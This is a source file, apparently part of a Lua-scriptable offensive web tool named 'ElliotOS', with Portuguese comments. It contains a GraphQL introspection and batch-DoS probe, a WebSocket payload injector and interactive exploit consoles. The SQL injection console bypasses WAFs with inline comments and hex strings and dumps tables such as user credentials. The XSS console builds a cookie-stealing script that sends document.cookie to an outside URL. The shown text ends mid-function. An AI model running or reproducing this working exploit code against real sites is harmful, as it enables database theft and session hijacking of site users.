    printf("\033[1;35m╚═══════════════════════════════════════╝\033[0m\n\n");
    printf("\033[1;33m[*] Target: %s\033[0m\n\n", url);

    /* introspection query completa */
    const char *intro_body =
        "{\"query\":\"{__schema{queryType{name}mutationType{name}"
        "types{name kind fields{name type{name kind ofType{name kind}}}"
        "inputFields{name type{name kind}}enumValues{name}}}}\"}";

    /* testa endpoints comuns */
    const char *gql_paths[] = { "", "/graphql", "/api/graphql", "/v1/graphql",
                                  "/query", "/gql", "/graphiql", NULL };
    int found_any = 0;
    for(int pi=0; gql_paths[pi]; pi++) {
        char full[1200]; snprintf(full,sizeof(full),"%s%s",url,gql_paths[pi]);
        CURL *ch=curl_easy_init(); if(!ch) continue;
        WorkBuf wb={0}; wb.buf=malloc(262144); wb.cap=262144; wb.len=0;
        struct curl_slist *hdrs=NULL;
        hdrs=curl_slist_append(hdrs,"Content-Type: application/json");
        hdrs=curl_slist_append(hdrs,"Accept: application/json");
        curl_easy_setopt(ch,CURLOPT_URL,full);
        curl_easy_setopt(ch,CURLOPT_POSTFIELDS,intro_body);
        curl_easy_setopt(ch,CURLOPT_HTTPHEADER,hdrs);
        curl_easy_setopt(ch,CURLOPT_WRITEFUNCTION,worker_write_cb);
        curl_easy_setopt(ch,CURLOPT_WRITEDATA,&wb);
        curl_easy_setopt(ch,CURLOPT_TIMEOUT,10L);
        curl_easy_setopt(ch,CURLOPT_CONNECTTIMEOUT,5L);
        curl_easy_setopt(ch,CURLOPT_SSL_VERIFYPEER,0L);
        curl_easy_setopt(ch,CURLOPT_SSL_VERIFYHOST,0L);
        curl_easy_setopt(ch,CURLOPT_FOLLOWLOCATION,1L);
        curl_easy_setopt(ch,CURLOPT_USERAGENT,"ElliotOS/v17");
        long http=0; curl_easy_perform(ch); curl_easy_getinfo(ch,CURLINFO_RESPONSE_CODE,&http);
        curl_slist_free_all(hdrs); curl_easy_cleanup(ch);

        if(wb.buf && wb.len>0 && (strstr(wb.buf,"__schema")||strstr(wb.buf,"queryType")||strstr(wb.buf,"\"data\""))) {
            printf("\033[1;32m[✓] GraphQL endpoint: %s (HTTP %ld)\033[0m\n", full, http);
            found_any = 1;
            /* extrai nomes de types */
            printf("\033[1;36m[*] Types encontrados:\033[0m\n");
            int type_count=0;
            char *p=wb.buf;
            while((p=strstr(p,"\"name\":\""))) {
                p+=8; char *e=strchr(p,'"'); if(!e) break;
                int namelen=(int)(e-p);
                if(namelen>0&&namelen<64&&*p!='_') {
                    char name[65]={0}; memcpy(name,p,namelen);
                    /* filtra types internos do GraphQL */
                    if(strncmp(name,"__",2)!=0&&strcmp(name,"String")!=0&&
                       strcmp(name,"Boolean")!=0&&strcmp(name,"Int")!=0&&
                       strcmp(name,"Float")!=0&&strcmp(name,"ID")!=0) {
                        printf("    \033[0;33m%s\033[0m\n", name);
                        type_count++;
                    }
                }
                p=e+1;
            }
            if(type_count==0) printf("    \033[0;90m(nenhum type customizado — introspection pode estar desabilitada)\033[0m\n");

            /* testa introspection desabilitada */
            if(strstr(wb.buf,"introspection")) {
                printf("\033[1;31m[!] Introspection DESABILITADA — endpoint existe mas não retorna schema\033[0m\n");
            }
            /* detecta playground/graphiql exposto */
            if(http==200 && strstr(wb.buf,"graphiql")) {
                printf("\033[1;31m[!] GraphiQL EXPOSTO — interface web acessível sem auth\033[0m\n");
            }
            printf("\n");
        }
        free(wb.buf);
    }

    /* testa batch query (DoS potencial) */
    printf("\033[1;33m[*] Testando batch queries...\033[0m\n");
    const char *batch_body = "[{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"}]";
    char full0[1200]; snprintf(full0,sizeof(full0),"%s/graphql",url);
    CURL *bch=curl_easy_init();
    if(bch){
        WorkBuf bwb={0}; bwb.buf=malloc(65536); bwb.cap=65536; bwb.len=0;
        struct curl_slist *bhdrs=NULL;
        bhdrs=curl_slist_append(bhdrs,"Content-Type: application/json");
        curl_easy_setopt(bch,CURLOPT_URL,full0);
        curl_easy_setopt(bch,CURLOPT_POSTFIELDS,batch_body);
        curl_easy_setopt(bch,CURLOPT_HTTPHEADER,bhdrs);
        curl_easy_setopt(bch,CURLOPT_WRITEFUNCTION,worker_write_cb);
        curl_easy_setopt(bch,CURLOPT_WRITEDATA,&bwb);
        curl_easy_setopt(bch,CURLOPT_TIMEOUT,8L);
        curl_easy_setopt(bch,CURLOPT_CONNECTTIMEOUT,5L);
        curl_easy_setopt(bch,CURLOPT_SSL_VERIFYPEER,0L);
        curl_easy_perform(bch);
        curl_slist_free_all(bhdrs); curl_easy_cleanup(bch);
        if(bwb.buf && bwb.len>2 && bwb.buf[0]=='[')
            printf("\033[1;31m[!] Batch queries HABILITADO — risco de amplificação DoS\033[0m\n\n");
        else
            printf("\033[0;90m    Batch queries desabilitado ou não suportado\033[0m\n\n");
        free(bwb.buf);
    }

    if(!found_any)
        printf("\033[0;90m[*] Nenhum endpoint GraphQL encontrado nos paths comuns\033[0m\n\n");

    lua_pushinteger(L, found_any); return 1;
}

/* ============================================================================
   mod.ws — WebSocket scanner: upgrade + payload injection
   ============================================================================ */

/* Gerador de WebSocket handshake key (base64 de 16 bytes aleatórios) */
static void ws_make_key(char *out, size_t outsz) {
    unsigned char rnd[16]; RAND_bytes(rnd,16);
    /* base64 manual */
    const char *t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int j=0;
    for(int i=0;i<12;i+=3){
        out[j++]=t[rnd[i]>>2];
        out[j++]=t[((rnd[i]&3)<<4)|(rnd[i+1]>>4)];
        out[j++]=t[((rnd[i+1]&0xf)<<2)|(rnd[i+2]>>6)];
        out[j++]=t[rnd[i+2]&0x3f];
    }
    out[j++]=t[rnd[12]>>2];
    out[j++]=t[((rnd[12]&3)<<4)|(rnd[13]>>4)];
    out[j++]=t[((rnd[13]&0xf)<<2)|(rnd[14]>>6)];
    out[j++]=t[rnd[14]&0x3f];
    out[j++]='='; out[j]=0; (void)outsz;
}

/* Envia frame WebSocket texto (mascarado, como cliente) */
static int ws_send_text(int fd, const char *msg) {
    size_t mlen=strlen(msg);
    unsigned char mask[4]; RAND_bytes(mask,4);
    unsigned char hdr[14]; int hlen=0;
    hdr[hlen++]=0x81; /* FIN + opcode text */
    if(mlen<126){ hdr[hlen++]=(unsigned char)(0x80|mlen); }
    else { hdr[hlen++]=0xFE; hdr[hlen++]=(mlen>>8)&0xFF; hdr[hlen++]=mlen&0xFF; }
    memcpy(hdr+hlen,mask,4); hlen+=4;
    if(write(fd,hdr,hlen)<0) return -1;
    unsigned char *payload=malloc(mlen);
    for(size_t i=0;i<mlen;i++) payload[i]=((unsigned char)msg[i])^mask[i%4];
    int r=(int)write(fd,payload,mlen); free(payload);
    return r;
}

static int l_mod_ws(lua_State *L) {
    const char *url_raw = luaL_checkstring(L,1);
    /* converte ws:// → http:// para parsear host/path */
    char url[1024]={0};
    if(strncmp(url_raw,"ws://",5)==0)        snprintf(url,sizeof(url),"http://%s",url_raw+5);
    else if(strncmp(url_raw,"wss://",6)==0)   snprintf(url,sizeof(url),"https://%s",url_raw+6);
    else { char tmp[1024]={0}; normalize_url(url_raw,tmp,sizeof(tmp)); snprintf(url,sizeof(url),"%s",tmp); }

    printf("\n\033[1;35m╔═══════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║  WebSocket Scanner                    ║\033[0m\n");
    printf("\033[1;35m╚═══════════════════════════════════════╝\033[0m\n\n");
    printf("\033[1;33m[*] Target: %s\033[0m\n\n", url_raw);

    /* extrai host, port, path */
    char host[256]={0}; int port=80; char path[512]="/";
    int is_https=0;
    const char *after_scheme=url;
    if(strncmp(url,"https://",8)==0){ after_scheme=url+8; port=443; is_https=1; }
    else if(strncmp(url,"http://",7)==0){ after_scheme=url+7; }
    const char *slash=strchr(after_scheme,'/');
    const char *colon=strchr(after_scheme,':');
    if(colon && (!slash || colon<slash)){
        int hlen=(int)(colon-after_scheme);
        if(hlen>0&&hlen<256) memcpy(host,after_scheme,hlen);
        port=atoi(colon+1);
        if(slash) snprintf(path,sizeof(path),"%s",slash);
    } else if(slash) {
        int hlen=(int)(slash-after_scheme);
        if(hlen>0&&hlen<256) memcpy(host,after_scheme,hlen);
        snprintf(path,sizeof(path),"%s",slash);
    } else {
        snprintf(host,sizeof(host),"%s",after_scheme);
    }
    if(strlen(path)==0) snprintf(path,sizeof(path),"/");

    /* tenta paths ws comuns se path for / */
    const char *ws_paths[] = { path, "/ws", "/websocket", "/socket", "/chat", "/live", NULL };
    int found=0;

    for(int pi=0; ws_paths[pi] && pi<6; pi++) {
        if(pi>0 && strcmp(path,"/")!=0) break; /* só testa extras se path for raiz */

        /* resolve host */
        struct addrinfo hints={0},*res=NULL;
        hints.ai_family=AF_UNSPEC; hints.ai_socktype=SOCK_STREAM;
        char portstr[8]; snprintf(portstr,sizeof(portstr),"%d",port);
        if(getaddrinfo(host,portstr,&hints,&res)!=0) { continue; }

        int fd=socket(res->ai_family,SOCK_STREAM,0);
        if(fd<0){ freeaddrinfo(res); continue; }
        struct timeval tv={5,0}; setsockopt(fd,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv));
        setsockopt(fd,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv));

        if(connect(fd,res->ai_addr,res->ai_addrlen)<0){
            close(fd); freeaddrinfo(res); continue;
        }
        freeaddrinfo(res);

        /* HTTP Upgrade request */
        char wskey[32]={0}; ws_make_key(wskey,sizeof(wskey));
        char req[1024];
        snprintf(req,sizeof(req),
            "GET %s HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            "Sec-WebSocket-Key: %s\r\n"
            "Sec-WebSocket-Version: 13\r\n"
            "User-Agent: ElliotOS/v17\r\n\r\n",
            ws_paths[pi], host, port, wskey);
        write(fd, req, strlen(req));

        char resp[2048]={0};
        int rlen=(int)read(fd,resp,sizeof(resp)-1);
        if(rlen<=0){ close(fd); continue; }
        resp[rlen]=0;

        if(strstr(resp,"101") && strstr(resp,"websocket")) {
            printf("\033[1;32m[✓] WebSocket UPGRADE aceito: %s%s\033[0m\n", url_raw, ws_paths[pi]);
            found++;

            /* testa payloads de injeção */
            const char *ws_payloads[] = {
                "<script>alert(1)</script>",
                "' OR '1'='1",
                "../../../etc/passwd",
                "{{7*7}}",
                "${7*7}",
                NULL
            };
            printf("\033[1;33m[*] Injetando payloads no WebSocket...\033[0m\n");
            for(int wi=0; ws_payloads[wi]; wi++) {
                ws_send_text(fd, ws_payloads[wi]);
                char wbuf[4096]={0};
                int wlen=(int)read(fd,wbuf,sizeof(wbuf)-1);
                if(wlen>2){
                    /* decodifica frame WS: pula header (2-10 bytes) */
                    int hdr_skip=2;
                    if(wlen>2){
                        int pay_len=wbuf[1]&0x7f;
                        if(pay_len==126) hdr_skip=4;
                        else if(pay_len==127) hdr_skip=10;
                        int masked=(wbuf[1]>>7)&1; if(masked) hdr_skip+=4;
                    }
                    char *wdata=wbuf+hdr_skip; int wdlen=wlen-hdr_skip;
                    if(wdlen>0 && wdlen<2048) {
                        /* verifica reflexão do payload */
                        char pay_short[64]={0}; strncpy(pay_short,ws_payloads[wi],32);
                        if(strstr(wdata,pay_short)||
                           (strstr(ws_payloads[wi],"7*7")&&strstr(wdata,"49"))){
                            printf("  \033[1;31m[✓ WS-INJECT] %s  →  refletido na resposta\033[0m\n", ws_payloads[wi]);
                        }
                    }
                }
                usleep(150000);
            }
            printf("\n");
        } else if(is_https==0 && strstr(resp,"HTTP/1")) {
            /* servidor respondeu HTTP normal — não é WS */
        }
        close(fd);
    }

    if(!found)
        printf("\033[0;90m[*] Nenhum endpoint WebSocket encontrado / upgrade recusado\033[0m\n\n");

    lua_pushinteger(L, found); return 1;
}

/* ============================================================================
   exploit.* — Post-exploitation interactive REPLs
   Cada função abre um loop interativo para operar a vulnerabilidade detectada.
   ============================================================================ */

/* helper: HTTP GET com payload no parâmetro, retorna body alocado (caller free) */
static char *exploit_fetch(const char *target, const char *payload, long *out_http) {
    char url[2048]; snprintf(url, sizeof(url), "%s%s", target, payload);
    CURL *ch = curl_easy_init(); if (!ch) return NULL;
    WorkBuf wb = {0}; wb.buf = malloc(262144); wb.cap = 262144; wb.len = 0;
    if (!wb.buf) { curl_easy_cleanup(ch); return NULL; }
    curl_easy_setopt(ch, CURLOPT_URL,            url);
    curl_easy_setopt(ch, CURLOPT_WRITEFUNCTION,  worker_write_cb);
    curl_easy_setopt(ch, CURLOPT_WRITEDATA,      &wb);
    curl_easy_setopt(ch, CURLOPT_TIMEOUT,        12L);
    curl_easy_setopt(ch, CURLOPT_CONNECTTIMEOUT, 5L);
    curl_easy_setopt(ch, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(ch, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(ch, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(ch, CURLOPT_USERAGENT,      "ElliotOS/v17");
    long http = 0;
    curl_easy_perform(ch);
    curl_easy_getinfo(ch, CURLINFO_RESPONSE_CODE, &http);
    curl_easy_cleanup(ch);
    if (out_http) *out_http = http;
    wb.buf[wb.len < 261000 ? wb.len : 261000] = 0;
    return wb.buf;
}

/* helper: URL-encode uma string (para payload no parâmetro) */
static void exploit_urlencode(const char *in, char *out, size_t outsz) {
    size_t j = 0;
    for (size_t i = 0; in[i] && j+4 < outsz; i++) {
        unsigned char c = (unsigned char)in[i];
        if ((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
            (c >= '0' && c <= '9') || c=='-' || c=='_' || c=='.' || c=='~') {
            out[j++] = (char)c;
        } else {
            j += snprintf(out+j, outsz-j, "%%%02X", (unsigned int)c);
        }
    }
    out[j] = 0;
}

/* extrai texto entre duas tags/marcadores (primeiro ocorrência) */
static char *exploit_extract_between(const char *body, const char *open, const char *close) {
    const char *s = strstr(body, open);
    if (!s) return NULL;
    s += strlen(open);
    const char *e = strstr(s, close);
    if (!e) e = s + strlen(s);
    size_t len = (size_t)(e - s);
    char *r = malloc(len + 1);
    memcpy(r, s, len); r[len] = 0;
    return r;
}

/* ── readline helper: lê linha com prompt colorido ── */
/* Wrappa escape codes ANSI com \001/\002 para readline calcular largura corretamente.
   Sem isso os "fantasmas" de caracteres aparecem ao editar a linha. */
static char *exploit_rl_wrap_prompt(const char *prompt, char *out, size_t outsz) {
    size_t j = 0;
    int in_esc = 0;
    for (size_t i = 0; prompt[i] && j + 4 < outsz; i++) {
        if (prompt[i] == '\033') {
            /* inicio de sequencia ANSI — insere marcador de inicio invisivel */
            out[j++] = '\001';  /* RL_PROMPT_START_IGNORE */
            out[j++] = '\033';
            in_esc = 1;
        } else if (in_esc && prompt[i] == 'm') {
            /* fim da sequencia ANSI — insere marcador de fim invisivel */
            out[j++] = 'm';
            out[j++] = '\002';  /* RL_PROMPT_END_IGNORE */
            in_esc = 0;
        } else {
            out[j++] = prompt[i];
        }
    }
    out[j] = 0;
    return out;
}

/* Salva e restaura o history do Lua REPL ao entrar/sair do exploit REPL.
   Assim o history do exploit é isolado e apagado no exit. */
static void exploit_history_push(void) {
#ifdef LUA_USE_READLINE
    /* salva posicao atual do history do Lua */
    using_history();
    /* limpa para comecar history limpo no exploit */
    clear_history();
#endif
}

static void exploit_history_pop(void) {
#ifdef LUA_USE_READLINE
    /* apaga history do exploit e restaura estado limpo */
    clear_history();
#endif
}

/* Ctrl+C dentro do exploit REPL: cancela linha atual (como bash), nao mata o processo */
static volatile int g_exploit_sigint = 0;
static void exploit_sigint_handler(int sig) {
    (void)sig;
    g_exploit_sigint = 1;
#ifdef LUA_USE_READLINE
    /* rl_done faz o readline retornar na proxima iteracao */
    rl_done = 1;
    /* limpa linha atual visivelmente */
    rl_replace_line("", 0);
    rl_redisplay();
#endif
    printf("\n");
}

static void exploit_sigint_install(void) {
    g_exploit_sigint = 0;
    struct sigaction sa = {0};
    sa.sa_handler = exploit_sigint_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    sigaction(SIGINT, &sa, NULL);
}

static void exploit_sigint_restore(void) {
    /* restaura SIGINT para comportamento padrao do Lua REPL */
    struct sigaction sa = {0};
    sa.sa_handler = SIG_DFL;
    sigemptyset(&sa.sa_mask);
    sigaction(SIGINT, &sa, NULL);
    g_exploit_sigint = 0;
}

static char *exploit_readline(const char *prompt) {
#ifdef LUA_USE_READLINE
    char wrapped[512];
    exploit_rl_wrap_prompt(prompt, wrapped, sizeof(wrapped));
    char *line = readline(wrapped);
    if (line && *line) add_history(line);
    return line;
#else
    printf("%s", prompt); fflush(stdout);
    char buf[4096] = {0};
    if (!fgets(buf, sizeof(buf), stdin)) return NULL;
    size_t l = strlen(buf);
    if (l > 0 && buf[l-1] == '\n') buf[l-1] = 0;
    return strdup(buf);
#endif
}

/* ──────────────────────────────────────────────────────────────────────────
   exploit.sqli — SQL injection interactive REPL
   Estratégia: UNION-based SELECT para extrair dados; fallback error-based.
   ────────────────────────────────────────────────────────────────────────── */
static int l_exploit_sqli(lua_State *L) {
    const char *target = luaL_checkstring(L, 1);
    printf("\n\033[1;31m╔══════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;31m║  exploit.sqli — SQL Injection REPL                           ║\033[0m\n");
    printf("\033[1;31m╚══════════════════════════════════════════════════════════════╝\033[0m\n\n");
    printf("\033[1;33m[*] Target : %s\033[0m\n", target);
    exploit_history_push();
    exploit_sigint_install();

    /* ── detecta WAF (bloqueia aspas?) ── */
    int waf_mode = 0;  // 0 = normal, 1 = bypass com comentario inline
    printf("\033[0;90m[*] Detectando WAF...\033[0m\n");
    {
        char enc[256]; exploit_urlencode("'", enc, sizeof(enc));
        char *body = exploit_fetch(target, enc, NULL);
        if (body) {
            if (strstr(body,"WAF") || strstr(body,"waf") || strstr(body,"nv\xc3\xa1lido") ||
                strstr(body,"invalido") || strstr(body,"blocked") || strstr(body,"Blocked")) {
                waf_mode = 1;
                printf("\033[1;33m[!] WAF detectado — modo bypass ativado (/**/ em vez de espacos, sem aspas)\033[0m\n");
            } else {
                printf("\033[1;32m[✓] Sem WAF — modo direto\033[0m\n");
            }
            free(body);
        }
    }

    /* ── detecta número de colunas ── */
    int ncols = 3;  /* padrão */
    printf("\033[0;90m[*] Detectando número de colunas...\033[0m\n");
    if (!waf_mode) {
        /* modo normal: ORDER BY */
        for (int n = 1; n <= 10; n++) {
            char probe[128]; snprintf(probe, sizeof(probe), "' ORDER BY %d-- -", n);
            char enc[256]; exploit_urlencode(probe, enc, sizeof(enc));
            char *body = exploit_fetch(target, enc, NULL);
            if (!body) continue;
            int err = strstr(body,"error") || strstr(body,"Error");
            free(body);
            if (err) { ncols = n - 1; break; }
            ncols = n;
        }
    } else {
        // modo WAF: UNION com comentario-inline sem aspas, prefixo % para LIKE
        for (int n = 1; n <= 6; n++) {
            char probe[256] = "%/**/UNION/**/SELECT/**/";
            for (int i = 0; i < n; i++) {
                if (i > 0) strncat(probe, ",", sizeof(probe)-strlen(probe)-1);
                strncat(probe, "1", sizeof(probe)-strlen(probe)-1);
            }
            strncat(probe, "-- -", sizeof(probe)-strlen(probe)-1);
            char enc[512]; exploit_urlencode(probe, enc, sizeof(enc));
            char *body = exploit_fetch(target, enc, NULL);
            if (body && !strstr(body,"error") && !strstr(body,"Error") && strlen(body) > 100) {
                ncols = n;
                printf("\033[1;32m[✓] %d coluna(s) via UNION bypass\033[0m\n", n);
                free(body); break;
            }
            if (body) free(body);
        }
    }
    if (ncols < 1) ncols = 1;
    if (!waf_mode) printf("\033[1;32m[✓] %d coluna(s) detectada(s)\033[0m\n", ncols);

    /* ── helper: monta payload UNION adaptado ao modo ── */
    /* coluna_expr: expressão SQL sem aspas no modo WAF, com aspas no modo normal */
    /* null_rest: preenche colunas restantes com NULL ou 1 */

    printf("\n\033[0;90m[*] Comandos: .tables  .cols <t>  .dump <t>  .version  .help  .exit\033[0m\n");
    if (waf_mode)
        printf("\033[0;90m[*] Modo WAF: use hex(0x...) para strings, /**/ para espacos\033[0m\n\n");
    else
        printf("\033[0;90m[*] SQL direto: SELECT * FROM users | ' OR '1'='1 | qualquer payload\033[0m\n\n");

    int cmds = 0;
    while (1) {
        const char *mode_color = waf_mode ? "\033[1;33m" : "\033[1;31m";
        char prompt[80]; snprintf(prompt, sizeof(prompt),
            "%ssqli%s\033[1;37m>\033[0m ", mode_color, "\033[0m");
        char *line = exploit_readline(prompt);
        if (!line || g_exploit_sigint) {
            if (g_exploit_sigint) { g_exploit_sigint=0; if(line)free(line); continue; }
            break;
        }
        while (*line == ' ') line++;
        size_t ll = strlen(line); while (ll > 0 && line[ll-1] == ' ') line[--ll] = 0;
        if (!*line) { free(line); continue; }
        if (strcmp(line,".exit")==0||strcmp(line,".quit")==0) { free(line); break; }

        char payload_sql[2048] = {0};

        if (strcmp(line,".tables")==0) {
            if (waf_mode)
                snprintf(payload_sql,sizeof(payload_sql),
                    "%%/**/UNION/**/SELECT/**/group_concat(name),2,3/**/FROM/**/sqlite_master-- -");
            else
                snprintf(payload_sql,sizeof(payload_sql),
                    "' UNION SELECT group_concat(name,', '),2,3 FROM sqlite_master WHERE type='table'-- -");

        } else if (strcmp(line,".version")==0) {
            if (waf_mode)
                snprintf(payload_sql,sizeof(payload_sql),
                    "%%/**/UNION/**/SELECT/**/sqlite_version(),2,3-- -");
            else
                snprintf(payload_sql,sizeof(payload_sql),
                    "' UNION SELECT sqlite_version(),2,3-- -");

        } else if (strncmp(line,".cols ",6)==0) {
            char tbl[128]={0}; strncpy(tbl,line+6,127);
            if (waf_mode) {
                /* hex-encode o nome da tabela */
                char hexname[300]="0x";
                for(int k=0;tbl[k];k++) snprintf(hexname+strlen(hexname),sizeof(hexname)-strlen(hexname),"%02x",(unsigned char)tbl[k]);
                snprintf(payload_sql,sizeof(payload_sql),
                    "%%/**/UNION/**/SELECT/**/group_concat(name),2,3/**/FROM/**/pragma_table_info(%s)-- -",hexname);
            } else {
                snprintf(payload_sql,sizeof(payload_sql),
                    "' UNION SELECT group_concat(name,', '),2,3 FROM pragma_table_info('%s')-- -",tbl);
            }

        } else if (strncmp(line,".dump ",6)==0) {
            char tbl[128]={0}; strncpy(tbl,line+6,127);
            if (waf_mode)
                snprintf(payload_sql,sizeof(payload_sql),
                    "%%/**/UNION/**/SELECT/**/1,2,3/**/FROM/**/%s/**/LIMIT/**/20-- -",tbl);
            else
                snprintf(payload_sql,sizeof(payload_sql),
                    "' UNION SELECT *,2,3 FROM %s LIMIT 20-- -",tbl);

        } else if (strcmp(line,".help")==0) {
            printf("\033[0;90m  .tables           — lista tabelas\033[0m\n");
            printf("\033[0;90m  .version          — sqlite_version()\033[0m\n");
            printf("\033[0;90m  .cols <tabela>    — colunas da tabela\033[0m\n");
            printf("\033[0;90m  .dump <tabela>    — primeiras 20 linhas\033[0m\n");
            printf("\033[0;90m  .waf on|off       — força modo WAF bypass\033[0m\n");
            if (waf_mode) {
                printf("\033[0;90m  Modo WAF ativo — prefixo %% para LIKE, /**/ para espaços\033[0m\n");
                printf("\033[0;90m  Hex de string: 0x%s (use -c \"print('users'.encode().hex())\")\033[0m\n","74657374");
                printf("\033[0;90m  Ex: %%/**/UNION/**/SELECT/**/group_concat(username,0x3a,password),2,3/**/FROM/**/users-- -\033[0m\n\n");
            } else {
                printf("\033[0;90m  SQL direto: SELECT * FROM users\033[0m\n");
                printf("\033[0;90m  Ex: ' UNION SELECT username,password,3 FROM users-- -\033[0m\n\n");
            }
            free(line); continue;

        } else if (strncmp(line,".waf ",5)==0) {
            if (strstr(line+5,"on"))  { waf_mode=1; printf("\033[1;33m[!] Modo WAF bypass ON\033[0m\n\n"); }
            else                      { waf_mode=0; printf("\033[1;32m[✓] Modo direto ON\033[0m\n\n"); }
            free(line); continue;

        } else {
            /* SQL / payload direto — usa como-está */
            snprintf(payload_sql,sizeof(payload_sql),"%s",line);
        }

        char enc[4096]; exploit_urlencode(payload_sql,enc,sizeof(enc));
        long http = 0;
        char *body = exploit_fetch(target,enc,&http);
        if (!body) { printf("\033[1;31m[!] Sem resposta\033[0m\n\n"); free(line); continue; }

        printf("\033[1;36m[HTTP %ld]\033[0m\n", http);

        /* extrai conteúdo de tags e exibe */
        const char *opens[] = {"<div class=box>","<div class=\"box\">","<td>","<p>","<pre>","<li>","<span>",NULL};
        const char *closes[]= {"</div>","</div>","</td>","</p>","</pre>","</li>","</span>",NULL};
        int printed = 0;
        for (int ti=0; opens[ti]; ti++) {
            const char *p = body; int cnt=0;
            while ((p=strstr(p,opens[ti])) && cnt < 50) {
                const char *cs = strchr(p,'>'); if (!cs){p++;continue;} cs++;
                const char *ce = strstr(cs,closes[ti]); if (!ce) ce=cs+strlen(cs);
                size_t clen=(size_t)(ce-cs); if(clen==0||clen>4096){p=ce+1;continue;}
                char val[4097]={0}; memcpy(val,cs,clen);
                char clean[4097]={0}; int ci2=0,intag=0;
                for(size_t k=0;k<clen;k++){
                    if(val[k]=='<')intag=1; else if(val[k]=='>')intag=0;
                    else if(!intag)clean[ci2++]=val[k];
                }
                char *tc=clean; while(*tc==' '||*tc=='\n'||*tc=='\r')tc++;
                if(*tc){printf("  \033[1;32m%s\033[0m\n",tc);printed=1;cnt++;}
                p=ce+1;
            }
            if(printed) break;
        }
        if (!printed) {
            /* fallback raw */
            char clean[2048]={0}; int ci2=0,intag=0;
            for(int k=0;body[k]&&ci2<2046;k++){
                if(body[k]=='<')intag=1; else if(body[k]=='>')intag=0;
                else if(!intag)clean[ci2++]=body[k];
            }
            char *out=clean; while(*out==' '||*out=='\n')out++;
            if(*out) printf("  \033[0;90m%s\033[0m\n",out);
            else printf("  \033[0;90m(resposta vazia ou sem conteúdo extraível)\033[0m\n");
        }
        printf("\n");
        free(body); free(line); cmds++;
    }

    exploit_history_pop();
    exploit_sigint_restore();
    printf("\033[0;90m[exploit/sqli] sessão encerrada — %d comando(s)\033[0m\n\n", cmds);
    lua_pushinteger(L, cmds); return 1;
}

static int l_exploit_xss(lua_State *L) {
    const char *target = luaL_checkstring(L, 1);
    printf("\n\033[1;35m╔══════════════════════════════════════════════════════════════╗\033[0m\n");
    printf("\033[1;35m║  exploit.xss — XSS Payload REPL                              ║\033[0m\n");
    printf("\033[1;35m╚══════════════════════════════════════════════════════════════╝\033[0m\n\n");
    printf("\033[1;33m[*] Target : %s\033[0m\n", target);
    exploit_history_push();
    exploit_sigint_install();
    printf("\033[0;90m[*] Comandos: .encode  .raw  .cookie  .steal <url>  .help  .exit\033[0m\n\n");

    int reflected = 0;
    while (1) {
        char *line = exploit_readline("\033[1;35mxss\033[0m\033[1;37m>\033[0m ");
        if (!line || g_exploit_sigint) {
            if (g_exploit_sigint) { g_exploit_sigint=0; if(line)free(line); continue; }
            break;
        }
        while (*line == ' ') line++;
        size_t ll = strlen(line); while (ll > 0 && line[ll-1]==' ') line[--ll]=0;
        if (!*line) { free(line); continue; }
        if (strcmp(line,".exit")==0||strcmp(line,".quit")==0) { free(line); break; }

        char payload[2048] = {0};

        if (strcmp(line, ".cookie") == 0) {
            snprintf(payload, sizeof(payload), "<script>alert(document.cookie)</script>");
        } else if (strncmp(line, ".steal ", 7) == 0) {
            char *url = line+7;
            snprintf(payload, sizeof(payload),
                "<script>new Image().src='%s?c='+encodeURIComponent(document.cookie)</script>", url);
        } else if (strcmp(line, ".encode") == 0) {
            char *prev = exploit_readline("  payload para encodar: ");
            if (prev) {
                printf("  \033[1;36mHTML entities :\033[0m ");
                for (size_t i = 0; prev[i]; i++) {
                    if (prev[i]=='<') printf("&lt;");
                    else if (prev[i]=='>') printf("&gt;");
                    else if (prev[i]=='"') printf("&quot;");
                    else if (prev[i]=='&') printf("&amp;");
                    else printf("%c", prev[i]);
                }
                printf("\n  \033[1;36mURL-encoded   :\033[0m ");
                char enc[4096]; exploit_urlencode(prev, enc, sizeof(enc));
                printf("%s\n\n", enc);
                free(prev);
            }
            free(line); continue;
        } else if (strcmp(line, ".help") == 0) {
            printf("\033[0;90m  <payload>        — envia e verifica reflexão  ex: <script>alert(1)</script>\033[0m\n");
            printf("\033[0;90m  .cookie          — injeta document.cookie\033[0m\n");
            printf("\033[0;90m  .steal <url>     — cookie stealer para <url>\033[0m\n");
            printf("\033[0;90m  .encode          — encode HTML/URL de um payload\033[0m\n");
            printf("\033[0;90m  .exit            — sair\033[0m\n\n");
            free(line); continue;
        } else {
            snprintf(payload, sizeof(payload), "%s", line);
        }

        char enc[4096]; exploit_urlencode(payload, enc, sizeof(enc));
        long http = 0;
        char *body = exploit_fetch(target, enc, &http);
        if (!body) { printf("\033[1;31m[!] Sem resposta\033[0m\n\n"); free(line); continue; }

        /* verifica reflexão — payload aparece não-escaped */
        int ref = body && strstr(body, payload) != NULL;
        /* verifica se está escapado */
        char escaped[32]; snprintf(escaped, sizeof(escaped), "&lt;");
        int esc = body && strstr(body, "&lt;") != NULL;

        if (ref && !esc) {
            printf("\033[1;32m[✓ REFLETIDO] HTTP %ld — payload aparece sem escaping na resposta\033[0m\n", http);
            reflected++;
        } else if (ref && esc) {
            printf("\033[1;33m[~ ESCAPADO] HTTP %ld — payload refletido mas HTML-escaped (&lt;)\033[0m\n", http);
        } else {
            printf("\033[0;90m[✗] HTTP %ld — payload não encontrado na resposta\033[0m\n", http);
        }

        /* mostra contexto ao redor do payload na resposta */
        if (body && ref) {
            char *pos = strstr(body, payload);
            if (!pos && esc) pos = strstr(body, "&lt;");
            if (pos) {
                int ctx_start = (int)(pos - body) - 80;
                if (ctx_start < 0) ctx_start = 0;
                char ctx[300] = {0}; strncpy(ctx, body + ctx_start, 200);
                printf("  \033[0;90mcontexto: ...%s...\033[0m\n", ctx);
            }
